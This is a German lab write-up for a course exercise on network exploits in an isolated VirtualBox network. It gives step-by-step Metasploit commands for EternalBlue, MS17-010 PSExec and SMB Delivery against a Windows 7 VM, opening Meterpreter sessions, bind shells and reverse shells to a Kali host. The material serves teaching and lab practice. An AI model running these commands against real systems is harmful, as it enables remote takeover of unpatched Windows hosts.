# Labor 4 - Netzwerk Exploits
## 1. Internes Netzwerk aufsetzen
**VirtualBox**: `Tools > Network > NAT Networks > Create`

    - Name: vboxnet
    - IPv4 Prefix: 192.168.100.0/24
    - DHCP-Server deaktivieren

## 2. VMs aufsetzen
**VirtualBox**: `New > follow the installation instructions`

    - User: zepi
    - Password: 123
    - In den Settings der VMs das Netzwerk auf das erstellte interne NAT Network setzen

## 3. Manuelle IP-Zuweisung
**Kali**: *während der Installation* oder `StatusBar > Internet (right click) > Edit Connections...`

    - IP: 192.168.100.10
    - Netmask: 255.255.255.0

**Windows 7:** `Netzwerk und Freigabecenter öffnen > LAN-Verbindung > Eigenschaften > Internetprotokoll Version 4 (TCP/IPv4)`

    - IP: 192.168.100.20
    - Netmask: 255.255.255.0

*Firewall deaktivieren*

### Verbindung Testen
Win > Kali
```powershell
ping 192.168.100.10
```
Kali > Win
```bash
ping 192.168.100.20
```

## 4. Exploits Ausführen

### 4.1 EternalBlue mit reverse_http Payload
**Kali**
```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
use PAYLOAD windows/x64/meterpreter/reverse_http
set -g RHOSTS 192.168.100.20
set -g LHOST 192.168.100.10
exploit
```
Durch `-g` wird der Wert global gesetzt und muss nicht erneut gesetzt werden.

Exploit testen:
```bash
sysinfo
screenshot
exit
```

### 4.2 MS17-010 PSExec mit bind_tcp Payload
**Kali**
```bash
msfconsole
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.100.20
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 4444

# Wichtig: Authentifizierung
set SMBUser zepi
set SMBPass 123

# Optional: Überprüfen der Einstellungen
show options

# Exploit ausführen
exploit
```

Exploit testen:
```bash
sysinfo
getuid
exit
```

Troubleshooting für PSExec:
- Falls "Unable to find accessible named pipe!" erscheint:
    1. Credentials überprüfen (zepi/123)
    2. Windows Services prüfen:
        - services.msc öffnen
        - "Server" Service muss laufen
        - "Windows Management Instrumentation" muss laufen
    3. Windows Firewall muss deaktiviert sein

### 4.3 SMB Delivery mit shell_reverse_tcp Payload
**Kali**
```bash
msfconsole
use exploit/windows/smb/smb_delivery

# Konfiguration
set SRVHOST 192.168.100.10
set PAYLOAD windows/shell_reverse_tcp
set LHOST 192.168.100.10
set LPORT 4445

# Optional: Status prüfen
show options

# Exploit starten (startet den Server)
exploit

# Der Exploit gibt einen PowerShell-Befehl aus, der auf dem Windows-System ausgeführt werden muss
```

**Windows 7**
1. PowerShell als Administrator öffnen
2. Den generierten PowerShell-Befehl aus Metasploit einfügen und ausführen

**Nach erfolgreicher Verbindung**
```bash
# Sessions anzeigen
sessions -l

# Mit Session verbinden
sessions -i 1
```

## 5. Unterschiede der Exploits
1. **EternalBlue (MS17-010)**
    - Nutzt SMBv1 Buffer Overflow
    - Benötigt keine Credentials
    - Reverse_http Payload für stabilere Verbindung
    - Direkter Meterpreter Zugriff

2. **PSExec (MS17-010)**
    - Nutzt Named Pipes
    - Benötigt gültige Credentials (zepi/123)
    - Bind_tcp Payload für direkten Zugriff
    - Kontrollierter Exploit-Ablauf

3. **SMB Delivery**
    - Client-seitige Ausführung über PowerShell
    - Nutzt SMB für Payload-Delivery
    - Shell_reverse_tcp für direkten Shell-Zugriff
    - Benötigt Benutzerinteraktion auf Zielsystem
